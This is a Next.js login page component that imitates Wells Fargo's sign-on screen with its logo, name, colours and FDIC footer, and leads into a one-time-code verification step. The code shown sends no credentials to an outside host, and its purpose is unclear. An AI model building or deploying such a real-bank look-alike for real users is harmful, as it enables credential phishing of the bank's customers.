"use client";

import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import { ArrowRight, CreditCard, Eye, EyeOff, Home, Lock, PiggyBank, ScanFace, TrendingUp, User } from "lucide-react";
import Button from "@/components/Button";
import { useAuth, verifyCredentials } from "@/lib/auth";

const REMEMBER_KEY = "wf_remember_userid";

function useGreeting() {
  const [text, setText] = useState("Welcome");
  useEffect(() => {
    const h = new Date().getHours();
    setText(h < 12 ? "Good morning" : h < 18 ? "Good afternoon" : "Good evening");
  }, []);
  return text;
}

const products = [
  { label: "Credit Cards", icon: CreditCard, desc: "Rewards & cash back" },
  { label: "Home Loans",   icon: Home,       desc: "Competitive rates"  },
  { label: "Savings",      icon: PiggyBank,  desc: "High-yield options" },
  { label: "Investing",    icon: TrendingUp, desc: "Grow your wealth"   },
];

export default function LoginPage() {
  const { user } = useAuth();
  const router = useRouter();
  const greeting = useGreeting();
  const [userId, setUserId]     = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw]     = useState(false);
  const [remember, setRemember] = useState(false);
  const [error, setError]       = useState("");
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    if (user) router.replace("/dashboard");
  }, [user, router]);

  useEffect(() => {
    try {
      const saved = localStorage.getItem(REMEMBER_KEY);
      if (saved) { setUserId(saved); setRemember(true); }
    } catch { /* ignore */ }
  }, []);

  const handleSubmit = async (e: { preventDefault(): void }) => {
    e.preventDefault();
    if (!userId.trim() || !password) {
      setError("Please enter your username and password.");
      return;
    }
    setError("");
    setSubmitting(true);

    const cred = verifyCredentials(userId, password);
    if (!cred.ok) {
      setError(cred.error);
      setSubmitting(false);
      return;
    }

    try {
      if (remember) localStorage.setItem(REMEMBER_KEY, userId);
      else          localStorage.removeItem(REMEMBER_KEY);
    } catch { /* ignore */ }

    try {
      const res  = await fetch("/api/send-login-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: cred.userId }),
      });
      const data = await res.json();
      if (!data.ok) {
        setError(data.error || "Failed to send verification code.");
        setSubmitting(false);
        return;
      }
      router.push(
        `/login-otp?uid=${encodeURIComponent(data.userInternalId)}&email=${encodeURIComponent(data.maskedEmail)}`
      );
    } catch {
      setError("Something went wrong. Please try again.");
      setSubmitting(false);
    }
  };

  return (
    <main className="min-h-screen flex flex-col bg-[#F5F5F5]">
      {/* ── Red hero section ─────────────────────────────────────────── */}
      <div
        className="relative flex flex-col items-center justify-end pb-10 pt-16"
        style={{ background: "linear-gradient(155deg,#D71E28 0%,#A01B22 60%,#7A1218 100%)" }}
      >
        {/* Ambient glow */}
        <div className="absolute top-[-40px] right-[-30px] h-[220px] w-[220px] rounded-full bg-white/10 blur-3xl pointer-events-none" />
        <div className="absolute bottom-[20px] left-[-20px] h-[160px] w-[160px] rounded-full bg-white/8 blur-2xl pointer-events-none" />

        <div className="relative z-10 flex flex-col items-center">
          {/* Logo */}
          <div className="h-[80px] w-[80px] rounded-[22px] bg-white shadow-lift flex items-center justify-center">
            <Image
              src="/well_logo.png"
              alt="Wells Fargo"
              width={64}
              height={64}
              priority
              className="rounded-[16px]"
            />
          </div>

          <div className="mt-4 text-center">
            <p className="text-[13px] font-semibold tracking-[0.2em] text-white/60 uppercase">
              Wells Fargo
            </p>
            <h1 className="mt-1 text-[28px] font-bold text-white leading-tight">
              {greeting}
            </h1>
            <p className="mt-1 text-[14px] text-white/70 font-medium">
              Sign on to your accounts
            </p>
          </div>
        </div>

        {/* Curved bottom edge */}
        <div className="absolute bottom-0 left-0 right-0 h-8 bg-[#F5F5F5] rounded-t-[32px]" />
      </div>

      {/* ── Form card ────────────────────────────────────────────────── */}
      <div className="flex-1 flex flex-col items-center px-5 pt-2 pb-10">
        <div className="w-full max-w-md">
          <div className="bg-white rounded-3xl shadow-soft border border-[#E6E8EB] p-6 sm:p-8">
            <h2 className="text-[18px] font-bold text-[#2D2926] mb-5">Sign On</h2>

            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Username */}
              <div>
                <label className="block text-[13px] font-semibold text-[#2D2926] mb-1.5">
                  Username
                </label>
                <div className="relative">
                  <User size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#9AA0A6]" />
                  <input
                    type="text"
                    autoComplete="username"
                    placeholder="Enter username"
                    value={userId}
                    onChange={(e) => setUserId(e.target.value)}
                    className="w-full pl-10 pr-4 py-3 rounded-xl border border-[#E6E8EB] bg-[#FAFAFA] text-sm text-[#2D2926] placeholder-[#B0B4BA] focus:border-[#D71E28] focus:outline-none focus:ring-2 focus:ring-[#D71E28]/15 transition"
                  />
                </div>
              </div>

              {/* Password */}
              <div>
                <label className="block text-[13px] font-semibold text-[#2D2926] mb-1.5">
                  Password
                </label>
                <div className="relative">
                  <Lock size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#9AA0A6]" />
                  <input
                    type={showPw ? "text" : "password"}
                    autoComplete="current-password"
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full pl-10 pr-11 py-3 rounded-xl border border-[#E6E8EB] bg-[#FAFAFA] text-sm text-[#2D2926] placeholder-[#B0B4BA] focus:border-[#D71E28] focus:outline-none focus:ring-2 focus:ring-[#D71E28]/15 transition"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPw((v) => !v)}
                    className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[#9AA0A6] hover:text-[#6D6E71] transition"
                    aria-label={showPw ? "Hide password" : "Show password"}
                  >
                    {showPw ? <EyeOff size={16} /> : <Eye size={16} />}
                  </button>
                </div>
              </div>

              {/* Remember + Face ID */}
              <div className="flex items-center justify-between pt-0.5">
                <label className="inline-flex items-center gap-2 cursor-pointer select-none">
                  <div
                    onClick={() => setRemember((v) => !v)}
                    className={`h-5 w-5 rounded-md border-2 flex items-center justify-center cursor-pointer transition-all ${
                      remember
                        ? "bg-[#D71E28] border-[#D71E28]"
                        : "border-[#D0D5DD] bg-white"
                    }`}
                  >
                    {remember && (
                      <svg viewBox="0 0 10 8" fill="none" className="h-3 w-3">
                        <path d="M1 4l2.5 2.5L9 1" stroke="white" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                    )}
                  </div>
                  <span className="text-[13px] text-[#2D2926] font-medium">Save username</span>
                </label>
                <button
                  type="button"
                  className="inline-flex items-center gap-1.5 text-[13px] font-semibold text-[#D71E28] hover:underline"
                >
                  <ScanFace size={15} /> Face ID
                </button>
              </div>

              {/* Error */}
              {error && (
                <div className="rounded-xl bg-red-50 border border-red-100 px-4 py-3 text-[13px] text-[#A01B22] leading-snug">
                  {error}
                </div>
              )}

              {/* Submit */}
              <Button
                type="submit"
                variant="primary"
                fullWidth
                size="lg"
                disabled={submitting}
              >
                {submitting ? "Signing on…" : "Sign On"}
                {!submitting && <ArrowRight size={16} />}
              </Button>

              {/* Forgot */}
              <div className="text-center">
                <a href="#" className="text-[13px] font-semibold text-[#D71E28] hover:underline">
                  Forgot username or password?
                </a>
              </div>
            </form>

            {/* Divider */}
            <div className="flex items-center gap-3 my-5">
              <div className="flex-1 h-px bg-[#E6E8EB]" />
              <span className="text-[11px] text-[#9AA0A6] font-semibold uppercase tracking-wider">
                or
              </span>
              <div className="flex-1 h-px bg-[#E6E8EB]" />
            </div>

            {/* Enroll */}
            <p className="text-center text-[13px] text-[#6D6E71]">
              New to Wells Fargo?{" "}
              <Link href="#" className="font-semibold text-[#D71E28] hover:underline">
                Enroll in Online Banking
              </Link>
            </p>
          </div>

          {/* ── Explore products ───────────────────────────────────── */}
          <div className="mt-6">
            <p className="text-[11px] font-semibold text-[#9AA0A6] uppercase tracking-wider text-center mb-4">
              Explore our products
            </p>
            <div className="grid grid-cols-2 gap-3">
              {products.map(({ label, icon: Icon, desc }) => (
                <a
                  key={label}
                  href="#"
                  className="flex items-center gap-3 p-4 rounded-2xl bg-white border border-[#E6E8EB] shadow-card hover:border-[#D71E28] hover:shadow-soft transition-all group"
                >
                  <span className="h-10 w-10 rounded-xl bg-[#D71E28]/10 text-[#D71E28] flex items-center justify-center shrink-0 group-hover:bg-[#D71E28] group-hover:text-white transition-colors">
                    <Icon size={18} />
                  </span>
                  <div className="min-w-0">
                    <p className="text-[13px] font-bold text-[#2D2926] leading-tight">{label}</p>
                    <p className="text-[11px] text-[#9AA0A6] mt-0.5">{desc}</p>
                  </div>
                </a>
              ))}
            </div>
          </div>

          {/* Legal footer */}
          <p className="mt-6 text-[11px] text-[#9AA0A6] text-center leading-relaxed px-2">
            Wells Fargo Bank, N.A. Member FDIC. Equal Housing Lender.
            <br />
            By signing on you agree to our{" "}
            <a href="#" className="underline hover:text-[#6D6E71]">Online Access Agreement</a>.
          </p>
        </div>
      </div>
    </main>
  );
}
